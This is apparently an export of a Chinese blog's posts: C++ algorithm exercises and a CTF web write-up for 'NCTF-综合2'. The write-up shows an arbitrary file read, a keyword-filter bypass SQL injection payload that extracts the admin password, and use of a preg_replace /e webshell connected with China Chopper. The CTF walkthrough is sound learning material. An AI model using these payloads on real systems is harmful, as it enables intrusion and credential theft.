<h2 id="n皇后问题"><a href="#n皇后问题" class="headerlink" title="n皇后问题"></a>n皇后问题</h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> n,ans=<span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">20</span>;
<span class="hljs-keyword">char</span> m[N][N];
<span class="hljs-keyword">bool</span> col[N],dg[N],udg[N];
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">if</span>(u==n)
	&#123;
<span class="hljs-comment">//		for(int i=0;i&lt;n;i++)</span>
<span class="hljs-comment">//		cout&lt;&lt;m[i]&lt;&lt;endl;</span>
		ans++;
		<span class="hljs-keyword">return</span>;
	&#125;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	&#123;
		<span class="hljs-keyword">if</span>(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i])
		&#123;
			m[u][i]=<span class="hljs-string">'Q'</span>;
			col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">1</span>;
			dfs(u+<span class="hljs-number">1</span>);
			col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">0</span>;<span class="hljs-comment">//回溯恢复现场 </span>
			m[u][i]=<span class="hljs-string">'.'</span>;
		&#125;
	&#125;
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)
		m[i][j]=<span class="hljs-string">'.'</span>;
	dfs(<span class="hljs-number">0</span>);
	<span class="hljs-built_in">cout</span>&lt;&lt;ans;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<h2 id="m图着色问题"><a href="#m图着色问题" class="headerlink" title="m图着色问题"></a>m图着色问题</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。</p>
<h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色<br>接下来k行，每行2个正整数，表示一条边的两个顶点</p>
<h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>所有不同的着色方案数</p>
<h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">8</span> <span class="hljs-number">4</span> 
<span class="hljs-symbol">1 </span><span class="hljs-number">2</span>
<span class="hljs-symbol">1 </span><span class="hljs-number">3</span> 
<span class="hljs-symbol">1 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">3</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">4 </span><span class="hljs-number">5</span></code></pre></div>

<h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">48</span></code></pre></div>

<h3 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h3><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;
<span class="hljs-keyword">int</span> mp[N][N];
<span class="hljs-keyword">int</span> color[N]=&#123;<span class="hljs-number">0</span>&#125;;
<span class="hljs-keyword">int</span> n,k,m,ans=<span class="hljs-number">0</span>;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> d)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">if</span>(d==n+<span class="hljs-number">1</span>)
	&#123;
		ans++;
		<span class="hljs-keyword">return</span>;
	&#125;
	
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)
	&#123;
		<span class="hljs-keyword">int</span> flag=<span class="hljs-number">1</span>;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)
		&#123;
			<span class="hljs-keyword">if</span>(mp[d][j]&amp;&amp;color[j]==i)
			&#123;
				flag=<span class="hljs-number">0</span>;
				<span class="hljs-keyword">break</span>;
			&#125;
		 &#125;
		 <span class="hljs-keyword">if</span>(flag)
		 &#123;
		 	 color[d]=i;
			 dfs(d+<span class="hljs-number">1</span>);
			 color[d]=<span class="hljs-number">0</span>; 	
		 &#125; 
	 &#125; 
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;m;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)
	&#123;
		<span class="hljs-keyword">int</span> t1,t2;
		<span class="hljs-built_in">cin</span>&gt;&gt;t1&gt;&gt;t2;
		mp[t1][t2]=<span class="hljs-number">1</span>;
		mp[t2][t1]=<span class="hljs-number">1</span>;
	&#125;
	dfs(<span class="hljs-number">1</span>);
	<span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>



<h2 id="部分和"><a href="#部分和" class="headerlink" title="部分和"></a>部分和</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。</p>
<h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。</p>
<p><em>1*</em>≤<strong>N</strong>≤*<em>20</em>，输入整数及k均小于<em>1e8</em>。</p>
<h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>若可以使得和为k，输出”Yes”,否则”No”。</p>
<h3 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-number">4</span>
<span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">7</span>
<span class="hljs-number">13</span></code></pre></div>

<h3 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-literal">Yes</span></code></pre></div>

<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> s[<span class="hljs-number">25</span>];
<span class="hljs-keyword">int</span> n,m;
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> a)</span></span>
<span class="hljs-function"></span>&#123;
	 <span class="hljs-keyword">if</span>(a==m) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
	 <span class="hljs-keyword">if</span>(l==n) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
	 <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a+s[l]))
	 <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
	 <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	&#123;
		<span class="hljs-built_in">cin</span>&gt;&gt;s[i];
	&#125;
	<span class="hljs-built_in">cin</span>&gt;&gt;m;
	<span class="hljs-keyword">if</span>(check(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
	<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"YES"</span>;
	<span class="hljs-keyword">else</span>
	<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"NO"</span>; 
	
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

]]></content>
      <categories>
        <category>c++</category>
      </categories>
  </entry>
  <entry>
    <title>综合2</title>
    <url>/2020/09/03/%E7%BB%BC%E5%90%882/</url>
    <content><![CDATA[<h1 id="NCTF-综合2"><a href="#NCTF-综合2" class="headerlink" title="NCTF-综合2"></a>NCTF-综合2</h1><a id="more"></a>

<p>进入页面，没什么特别的地方，随便点点</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/1.png" srcset="/img/loading.gif" alt></p>
<p>留言可以正常提交，本以为有xss,但是已经提示不是xss</p>
<p>看到最下面有个网站说明   <a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">本CMS说明</a>  ，有用的内容如下</p>
<blockquote>
<p>config.php：存放数据库信息，移植此CMS时要修改 </p>
<p>index.php：主页文件 </p>
<p>passencode.php：Funny公司自写密码加密算法库 </p>
<p>say.php：用于接收和处理用户留言请求 </p>
<p>sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索</p>
<p>admin表结构 create table admin ( id integer, username text, userpass text, )  </p>
</blockquote>
<p> <code>http://cms.nuptzj.cn/about.php?file=sm.txt</code>可以使用php伪协议任意读取文件内容。 包括自己</p>
<p>尝试读取index.php的源码，发现好像并没有什么用</p>
<p>读取<code>about.php</code></p>
<div class="hljs"><pre><code class="hljs php+HTML">
&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;

&lt;?php
$file&#x3D;$_GET[&#39;file&#39;];
if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   &#x2F;&#x2F; 有config.php
	echo &quot;file参数不能为空！&quot;;
	exit();
&#125;else&#123;
	$cut&#x3D;strchr($file,&quot;loginxlcteam&quot;);   &#x2F;&#x2F;包含了 loginxlcteam页面
	if($cut&#x3D;&#x3D;false)&#123;
	$data&#x3D;file_get_contents($file);
	$date&#x3D;htmlspecialchars($data);
	echo $date;
	&#125;else&#123;
		echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;;
	&#125;
&#125;</code></pre></div>

<p>读取config.php，无有用信息</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" srcset="/img/loading.gif" alt></p>
<p>查看<code>loginxlcteam</code>,是个登录页面</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/3.png" srcset="/img/loading.gif" alt></p>
<p>到此还是无从下手，参考大佬的博客 <a href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p>
<p>在搜索页面中也存在有用信息</p>
<p> <code>http://cms.nuptzj.cn/about.php?file=so.php</code>获取源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//so.php</span>
<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>]!=<span class="hljs-string">"Xlcteam Browser"</span>)&#123; 
    <span class="hljs-comment">//必须修改http头，吧user-agent改成Xlcteam Browser</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;
    <span class="hljs-keyword">exit</span>();
&#125;
$id=$_POST[<span class="hljs-string">'soid'</span>];				<span class="hljs-comment">//post 一个soid</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">'config.php'</span>;
<span class="hljs-keyword">include</span> <span class="hljs-string">'antiinject.php'</span>;   <span class="hljs-comment">//防注入的文件</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">'antixss.php'</span>;      <span class="hljs-comment">//防xss的文件		</span>
$id=antiinject($id);		<span class="hljs-comment">//对id过滤</span>
$con = mysql_connect($db_address,$db_user,$db_pass) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"不能连接到数据库！！"</span>.mysql_error());
mysql_select_db($db_name,$con);
$id=mysql_real_escape_string($id);
$result=mysql_query(<span class="hljs-string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);  <span class="hljs-comment">//sql查询，可能存在注入点</span>
$rs=mysql_fetch_array($result);
<span class="hljs-keyword">echo</span> htmlspecialchars($rs[<span class="hljs-string">'nice'</span>]).<span class="hljs-string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="hljs-string">'say'</span>]).<span class="hljs-string">'&lt;br /&gt;'</span>;
mysql_free_result($result);
mysql_free_result($file);
mysql_close($con);
<span class="hljs-meta">?&gt;</span></code></pre></div>





<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-comment">//antiinject.php源码</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">antiinject</span><span class="hljs-params">($content)</span></span>
<span class="hljs-function"> </span>&#123; 
 	$keyword=<span class="hljs-keyword">array</span>(<span class="hljs-string">"select"</span>,<span class="hljs-string">"union"</span>,<span class="hljs-string">"and"</span>,<span class="hljs-string">"from"</span>,<span class="hljs-string">' '</span>,<span class="hljs-string">"'"</span>,<span class="hljs-string">";"</span>,<span class="hljs-string">'"'</span>,<span class="hljs-string">"char"</span>,<span class="hljs-string">"or"</span>,<span class="hljs-string">"count"</span>,<span class="hljs-string">"master"</span>,<span class="hljs-string">"name"</span>,<span class="hljs-string">"pass"</span>,<span class="hljs-string">"admin"</span>,<span class="hljs-string">"+"</span>,<span class="hljs-string">"-"</span>,<span class="hljs-string">"order"</span>,<span class="hljs-string">"="</span>); <span class="hljs-comment">//对一些sql注入时用到的关键词进行了过滤</span>
     $info=strtolower($content); 
 	<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;=count($keyword);$i++)
 	&#123; 
 		$info=str_replace($keyword[$i], <span class="hljs-string">''</span>,$info); 
 	&#125; 
 <span class="hljs-keyword">return</span> $info; 
 &#125; 
 <span class="hljs-meta">?&gt;</span></code></pre></div>

<p>大致意思就是</p>
<p>1.判断http请求头中的user-agent参数是否为Xlcteam Browser</p>
<p>2.post参数soid</p>
<p>3.对soid进行过滤后带入sql语句中查询</p>
<p>于是抓包修改user-agent</p>
<p>确定存在注入点</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/4.png" srcset="/img/loading.gif" alt></p>
<p>由于之前提示了<strong>admin表结构 create table admin ( id integer, username text, userpass text, )</strong>  </p>
<p>可直接写出查询语句</p>
<div class="hljs"><pre><code class="hljs reasonml">(sselectelect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">userppassass</span>)</span><span class="hljs-comment">/**/</span>ffromrom<span class="hljs-comment">/**/</span>aadmindmin)</code></pre></div>

<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/5.png" srcset="/img/loading.gif" alt></p>
<p>ASCII码转字符串结果为： fuckruntu </p>
<p>登录</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/6.png" srcset="/img/loading.gif" alt></p>
<p> <strong><a href="http://cms.nuptzj.cn/about.php?file=xlcteam.php" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=xlcteam.php</a></strong>  查看源码</p>
<div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
$e = $_REQUEST[<span class="hljs-string">'www'</span>]; 
$arr = <span class="hljs-keyword">array</span>($_POST[<span class="hljs-string">'wtf'</span>] =&gt; <span class="hljs-string">'|.*|e'</span>,); 
array_walk($arr, $e, <span class="hljs-string">''</span>); 
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>看样子是可以用菜刀连接的</p>
<p> 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：<br>参考<a href="https://www.jb51.net/article/38714.htm" target="_blank" rel="noopener">https://www.jb51.net/article/38714.htm</a><br>简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。<br>用菜刀连接： </p>
<p>url:<a href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace" target="_blank" rel="noopener">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</a></p>
<p>密码：wtf</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/7.png" srcset="/img/loading.gif" alt></p>
<p><strong>总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！</strong></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>php</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>迷宫问题</title>
    <url>/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h1><a id="more"></a>

<h2 id="原题"><a href="#原题" class="headerlink" title="原题"></a>原题</h2><p>题目描述</p>
<p>小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。<br> 小明只能向上下左右四个方向移动。</p>
<p>输入</p>
<p>输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。<br> 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。<br> 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。<br> 字符的含义如下：<br>‘S’：起点<br>‘E’：终点<br>‘-’：空地，可以通过<br>‘#’：障碍，无法通过<br> 输入数据保证有且仅有一个起点和终点。</p>
<p>输出</p>
<p>对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。</p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code>1
5 5
s-###
-----
##---
E#---
---##</code></pre></div><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code>9</code></pre></div><h2 id="解决代码"><a href="#解决代码" class="headerlink" title="解决代码"></a>解决代码</h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span>
<span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//用于存放迷宫地图 </span>
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,intP;  <span class="hljs-comment">//坐标</span>
<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//在当前坐标下能走的四个方向</span>
<span class="hljs-keyword">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)为起点坐标  （ex,ey）为终点坐标</span>
<span class="hljs-keyword">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 </span>
<span class="hljs-keyword">int</span> r,l;  <span class="hljs-comment">//r为行数 l为列数 </span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(de));
	<span class="hljs-built_in">queue</span>&lt;Pqu;
	qu.push(P(sx,sy));   //将起点坐标放入队头 
	de[sx][sy]=0;
	<span class="hljs-keyword">while</span>(!qu.empty()) 
	&#123;
		P p=qu.front();   //取出队头坐标 
		qu.pop() ;//删除对头及走过的坐标 
		x=p.first,y=p.second; 
		<span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; //到达终点 跳出循环		
	 	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=0;i&lt;4;i++)
		&#123;
			nx=x+to[0][i];//开始向四个方向移动 
			ny=y+to[1][i];			
				<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">'#'</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>)
	 <span class="hljs-comment">//判断是否越界 以及是否能走  排除走过的路 </span>
	 &#123;
	 	 qu.push(P(nx,ny));  <span class="hljs-comment">//将能走的坐标放入队列 之后依次删除 </span>
						 de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//步数加一 </span>
					  &#125; 				  
			&#125;
	&#125;
	<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//终点的记步数组为-1 及不能到达终点 </span>
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n,i,j;
	<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;
		<span class="hljs-keyword">while</span>(n--)&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;
			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;
				<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; 
				<span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];
				<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'S'</span>) <span class="hljs-comment">//记录起点坐标 </span>
				 &#123;
					sx=i,sy=j;
				 &#125; 
				 <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'E'</span>)  <span class="hljs-comment">//记录终点坐标 </span>
				 &#123;
				 	ex=i,ey=j;
				 &#125;
				&#125;
			&#125;
			<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>bfs</tag>
      </tags>
  </entry>
</search>
